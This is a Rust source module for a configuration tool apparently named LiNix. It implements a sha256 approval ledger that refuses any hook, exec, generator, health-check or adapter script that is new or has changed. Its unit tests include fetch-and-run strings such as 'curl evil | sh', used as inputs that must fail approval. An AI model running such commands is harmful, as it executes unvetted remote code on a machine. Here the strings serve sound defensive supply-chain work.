//! The hook approval ledger (II.12): "the lock is the approval".
//!
//! A hook runs arbitrary code on your machine as part of a sync — an `after_install` script,
//! a `before_sync` step. When that code lives in a module you pulled from `github:x/y`, or
//! even in your own config, the supply-chain question is the same: *is this the script I
//! agreed to run, or has it changed since?* The lock answers it. `locks/hooks.toml` records
//! the sha256 of every hook script the moment you approved it (`linix lock`); before a sync
//! runs any hook, LiNix re-hashes it and refuses if the hash is new or different.
//!
//! Two rules, both from II.12:
//!
//! 1. **Hash everything, including your own scripts.** One rule, no exceptions — a supply
//!    chain that trusts "local" scripts is a supply chain with a hole the exact shape of the
//!    thing an attacker drops in your repo.
//! 2. **`-y` cannot approve.** A confirmation prompt is answered by every CI job; approval is
//!    a deliberate, separate act (`linix lock`) so an unattended run can never rubber-stamp a
//!    script that changed under it.
//!
//! This module is pure: hashing, the ledger, and the New/Changed/Approved verdict. Enforcement
//! (calling `verdict` before a hook runs and turning `Changed`/`New` into a refusal) is the
//! caller's job — see `LuaHooks::verify_all_approved`.

use crate::core::{Error, Result};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::path::Path;

/// The sha256, in lowercase hex, of a hook script's exact bytes. The whole trust model rests
/// on this being the *running* bytes, so callers hash what they are about to execute — not a
/// path, not a cached copy.
pub fn hash_script(body: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(body.as_bytes());
    hex::encode(hasher.finalize())
}

/// The stable identity of a hook across runs: which hook, for which package. `after_install`
/// for `nginx` is a different approval from `after_install` for `redis`, and the `*` catch-all
/// is its own identity — so changing one never silently re-approves another.
pub fn hook_id(hook_name: &str, package_name: &str) -> String {
    format!("{}:{}", hook_name, package_name)
}

/// The ledger identity of a `vars` provider (V.55). A provider that executes — `vars.linix`
/// or an external `vars.<ext>` — is a script that runs on your machine, so it lives in the
/// same ledger as a hook, keyed by its filename. It runs at step 0 of resolution, before any
/// plan and on read-only commands, so this is the only thing between a pulled config and a
/// shell.
pub fn vars_id(filename: &str) -> String {
    format!("vars:{}", filename)
}

/// The ledger identity of an `exec:` script (XIII.3, II.12).
///
/// An `exec:` runs code the repo carries, which is II.12's question exactly — *"the ledger is
/// the only thing between a pulled config and a shell"* — and II.12 admits no exceptions, so a
/// script is approved before it runs, by `linix lock`, and `-y` cannot approve it.
///
/// Keyed by the declared path, while `locks/exec.toml` is keyed by content: the two ledgers
/// answer different questions. *Is this allowed to run?* is about a script you reviewed at a
/// place; *has this already run?* is about bytes. A path whose content changed is therefore
/// both unapproved and un-run, which is the intended pair.
pub fn exec_id(script: &str) -> String {
    format!("exec:{}", script)
}

/// The ledger id for a user-declared health-check *command* (U31). Only `Probe::Command` needs
/// approval — a `port:` probe runs no code. The command text is the slot and its hash is the
/// content, so a changed command reads as a different, un-approved check rather than silently
/// inheriting the old approval.
pub fn health_id(command: &str) -> String {
    format!("health:{}", command)
}

/// The ledger identity of a `generate:` command (XIII.30, U33). A generator runs code the repo
/// carries and treats its stdout as declarations, so it is II.12's supply-chain question exactly
/// — approved before it runs, by `linix lock`, `-y` cannot approve. Keyed by the declared
/// command so a changed command reads as a new, unapproved generator.
pub fn generate_id(command: &str) -> String {
    format!("generate:{}", command)
}

/// The ledger identity of a hook on one of LiNix's own events (XIII.13, U15).
///
/// **Keyed by event AND location**, because U15 put the same event's hook in two places: the
/// config repo's `hooks/<event>` and this machine's `preferences.toml`. They are separately
/// approved — approving the shared policy must not silently rubber-stamp whatever the local
/// file happens to hold, which is exactly the substitution the ledger exists to catch.
pub fn event_id(event: &str, origin: &str) -> String {
    format!("event:{}@{}", event, origin)
}

/// The ledger identity of one file under `adapters/` (7a/U1, U10). A definition is argv LiNix
/// will run, and it travels with the repo, so it is the same supply-chain surface a hook is.
///
/// **One identity per file, whatever number of definitions it holds.** A per-definition
/// identity would let an edit that *adds* one go unnoticed, and adding one is the whole attack.
pub fn adapter_id(filename: &str) -> String {
    format!("adapters:{}", filename)
}

/// What the ledger says about a hook whose current hash we just computed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// The current hash matches the approved one. Run it.
    Approved,
    /// No approval on record. A hook LiNix has never seen is not implicitly trusted (II.12).
    New,
    /// An approval exists, but the script has changed since. This is the case the whole
    /// mechanism exists for: the script you approved is not the script about to run.
    Changed { was: String, now: String },
}

impl Verdict {
    /// Whether this verdict permits the hook to run. Only `Approved` does.
    pub fn is_approved(&self) -> bool {
        matches!(self, Verdict::Approved)
    }
}

/// `locks/hooks.toml`: the approved hash for every hook, keyed by [`hook_id`]. A `BTreeMap`
/// so the file serializes in a stable order and diffs cleanly in git.
#[derive(Debug, Clone, Default, Deserialize, Serialize, PartialEq, Eq)]
pub struct HookLedger {
    #[serde(default)]
    approvals: BTreeMap<String, String>,
}

impl HookLedger {
    pub fn new() -> Self {
        Self::default()
    }

    /// The ledger's path under the repo's `locks/` directory (II.6).
    pub fn path_in(locks_dir: &Path) -> std::path::PathBuf {
        locks_dir.join("hooks.toml")
    }

    /// Load the ledger from `path`. A missing file is not an error — it means nothing has
    /// been approved yet, which is the correct starting state (everything reads as `New`).
    pub fn load(path: &Path) -> Result<Self> {
        match std::fs::read_to_string(path) {
            Ok(s) => toml::from_str(&s)
                .map_err(|e| Error::Toml(format!("reading {}: {}", path.display(), e))),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Self::new()),
            Err(e) => Err(Error::Io(format!("reading {}: {}", path.display(), e))),
        }
    }

    /// Write the ledger to `path`, creating the `locks/` directory if needed.
    /// Through `persist`, so a preview does not write an approval or a pin. `linix
    /// --dry-run lock` used to leave `locks/versions.json` and `locks/hooks.toml` behind.
    pub fn save(&self, path: &Path) -> Result<()> {
        if !crate::core::dry_run::active() {
            if let Some(dir) = path.parent() {
                std::fs::create_dir_all(dir)
                    .map_err(|e| Error::Io(format!("creating {}: {}", dir.display(), e)))?;
            }
        }
        let body = toml::to_string_pretty(self)
            .map_err(|e| Error::Toml(format!("serializing hook ledger: {}", e)))?;
        crate::utils::file::persist(path, &body).map(|_| ())
    }

    /// The verdict for a hook whose script currently hashes to `current_hash`.
    pub fn verdict(&self, id: &str, current_hash: &str) -> Verdict {
        match self.approvals.get(id) {
            None => Verdict::New,
            Some(approved) if approved == current_hash => Verdict::Approved,
            Some(approved) => Verdict::Changed {
                was: approved.clone(),
                now: current_hash.to_string(),
            },
        }
    }

    /// Record `hash` as the approved hash for `id`. This is what `linix lock` does; nothing
    /// else writes an approval, so approval stays a deliberate act.
    pub fn approve(&mut self, id: &str, hash: &str) {
        self.approvals.insert(id.to_string(), hash.to_string());
    }

    /// The approved hash for `id`, if there is one.
    pub fn get(&self, id: &str) -> Option<&str> {
        self.approvals.get(id).map(String::as_str)
    }

    /// Every approved id and its hash, for `linix lock --list` to report.
    pub fn entries(&self) -> impl Iterator<Item = (&str, &str)> {
        self.approvals.iter().map(|(i, h)| (i.as_str(), h.as_str()))
    }

    /// Withdraw one approval, so whatever it names is refused again until it is re-approved.
    /// Reports whether there was anything to withdraw.
    pub fn revoke(&mut self, id: &str) -> bool {
        self.approvals.remove(id).is_some()
    }

    /// How many hooks are approved.
    pub fn len(&self) -> usize {
        self.approvals.len()
    }

    pub fn is_empty(&self) -> bool {
        self.approvals.is_empty()
    }
}

/// The refusal an unapproved or changed hook produces (II.12). It leads with the fact — the
/// script is not the one you approved — and ends with the one command that resolves it, so a
/// reader is never left guessing why a sync stopped.
pub fn refusal(id: &str, source: &str, verdict: &Verdict) -> String {
    match verdict {
        Verdict::Approved => String::new(),
        Verdict::New => format!(
            "`{}` ({}) has never been approved.\n  \
             It runs code on this machine, and LiNix will not run what it has not seen.\n  \
             Review it, then run `linix lock` to approve it.",
            id, source
        ),
        Verdict::Changed { was, now } => format!(
            "`{}` ({}) changed since you approved it.\n  \
             was: sha256:{}\n  now: sha256:{}\n  \
             Review the change, then run `linix lock` to approve it.",
            id,
            source,
            short(was),
            short(now),
        ),
    }
}

/// The first 12 hex chars of a hash, for a message a human can compare at a glance without
/// the full 64 characters of noise.
fn short(hash: &str) -> &str {
    &hash[..hash.len().min(12)]
}

/// The II.12 refusal for one `adapters/` file's current contents, or `None` when the ledger in
/// `locks_dir` has approved it. The one approval check every adapter file shares — the backend
/// onboarder, the snapshot loader and any future kind all call this rather than re-deriving the
/// hash/verdict dance, so none of them can drift into trusting a file the others would refuse.
pub fn adapter_refusal(path: &Path, content: &str, locks_dir: &Path) -> Option<String> {
    let ledger = match HookLedger::load(&HookLedger::path_in(locks_dir)) {
        Ok(l) => l,
        Err(e) => return Some(format!("could not read the approval ledger: {}", e)),
    };
    let name = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("adapter.toml");
    let id = adapter_id(name);
    let verdict = ledger.verdict(&id, &hash_script(content));
    if verdict.is_approved() {
        return None;
    }
    Some(refusal(&id, "adapter definition", &verdict))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hashing_is_stable_and_sensitive() {
        // Same bytes → same hash; one changed byte → different hash. The whole guard rests
        // on both halves of this.
        let a = hash_script("echo hello");
        assert_eq!(a, hash_script("echo hello"));
        assert_ne!(a, hash_script("echo hello "));
        // sha256 hex is 64 chars.
        assert_eq!(a.len(), 64);
    }

    #[test]
    fn an_unrecorded_hook_is_new_not_trusted() {
        let ledger = HookLedger::new();
        assert_eq!(ledger.verdict("after_install:nginx", "abc"), Verdict::New);
    }

    #[test]
    fn a_matching_hash_is_approved() {
        let mut ledger = HookLedger::new();
        let h = hash_script("./setup.sh");
        ledger.approve("after_install:nginx", &h);
        assert_eq!(ledger.verdict("after_install:nginx", &h), Verdict::Approved);
        assert!(ledger.verdict("after_install:nginx", &h).is_approved());
    }

    #[test]
    fn a_drifted_script_is_changed_and_carries_both_hashes() {
        let mut ledger = HookLedger::new();
        let old = hash_script("./setup.sh v1");
        let new = hash_script("./setup.sh v2 — now with curl | sh");
        ledger.approve("after_install:nginx", &old);
        match ledger.verdict("after_install:nginx", &new) {
            Verdict::Changed { was, now } => {
                assert_eq!(was, old);
                assert_eq!(now, new);
            }
            other => panic!("expected Changed, got {:?}", other),
        }
    }

    #[test]
    fn approving_one_hook_does_not_approve_another() {
        // Distinct identities: approving nginx's hook must not vouch for redis's.
        let mut ledger = HookLedger::new();
        ledger.approve(&hook_id("after_install", "nginx"), "hash-n");
        assert!(ledger
            .verdict(&hook_id("after_install", "nginx"), "hash-n")
            .is_approved());
        assert_eq!(
            ledger.verdict(&hook_id("after_install", "redis"), "hash-r"),
            Verdict::New
        );
    }

    #[test]
    fn re_approving_updates_to_the_new_hash() {
        // `linix lock` after a reviewed change: the new hash becomes the approved one.
        let mut ledger = HookLedger::new();
        ledger.approve("after_install:nginx", "old");
        ledger.approve("after_install:nginx", "new");
        assert_eq!(
            ledger.verdict("after_install:nginx", "new"),
            Verdict::Approved
        );
        assert!(matches!(
            ledger.verdict("after_install:nginx", "old"),
            Verdict::Changed { .. }
        ));
    }

    #[test]
    fn the_ledger_round_trips_through_toml() {
        // The on-disk format must survive a save/load without reordering or loss. Tested in
        // memory (serialize → parse) so it needs no filesystem.
        let mut ledger = HookLedger::new();
        ledger.approve("after_install:nginx", "aaa");
        ledger.approve("before_sync:*", "bbb");
        let body = toml::to_string_pretty(&ledger).unwrap();
        let parsed: HookLedger = toml::from_str(&body).unwrap();
        assert_eq!(ledger, parsed);
        assert_eq!(parsed.len(), 2);
    }

    #[test]
    fn a_missing_file_loads_as_an_empty_ledger() {
        let ledger = HookLedger::load(Path::new("does/not/exist/hooks.toml")).unwrap();
        assert!(ledger.is_empty());
    }

    #[test]
    fn a_health_command_is_approved_by_its_hash_and_a_changed_one_is_not() {
        // U31: a health-check command rides the ledger. Approving the exact command makes it
        // Approved; editing it one byte makes it an unapproved (New) check, never a silent pass.
        let cmd = "systemctl is-active nginx";
        let mut ledger = HookLedger::new();
        ledger.approve(&health_id(cmd), &hash_script(cmd));
        assert!(ledger
            .verdict(&health_id(cmd), &hash_script(cmd))
            .is_approved());
        let edited = "systemctl is-active nginx2";
        assert!(!ledger
            .verdict(&health_id(edited), &hash_script(edited))
            .is_approved());
    }

    #[test]
    fn a_generate_command_is_approved_by_its_hash() {
        // U33: a generator rides the ledger like exec:. A changed script (different bytes) is an
        // unapproved, un-run generator, never a silent inherited approval.
        let mut ledger = HookLedger::new();
        let v1 = "echo apt:ripgrep";
        ledger.approve(&generate_id("./pick.sh"), &hash_script(v1));
        assert!(ledger
            .verdict(&generate_id("./pick.sh"), &hash_script(v1))
            .is_approved());
        let v2 = "echo apt:ripgrep; curl evil | sh";
        assert!(!ledger
            .verdict(&generate_id("./pick.sh"), &hash_script(v2))
            .is_approved());
    }

    #[test]
    fn the_new_refusal_names_the_hook_and_the_fix() {
        let msg = refusal("after_install:nginx", "github:acme/fonts", &Verdict::New);
        assert!(msg.contains("after_install:nginx"));
        assert!(msg.contains("github:acme/fonts"));
        assert!(msg.contains("linix lock"));
    }

    #[test]
    fn the_changed_refusal_shows_both_short_hashes() {
        let was = "a".repeat(64);
        let now = "b".repeat(64);
        let msg = refusal(
            "after_install:nginx",
            "local",
            &Verdict::Changed {
                was: was.clone(),
                now: now.clone(),
            },
        );
        assert!(msg.contains("was: sha256:aaaaaaaaaaaa"));
        assert!(msg.contains("now: sha256:bbbbbbbbbbbb"));
        // The full 64-char hash is not dumped into the message.
        assert!(!msg.contains(&was));
    }
}
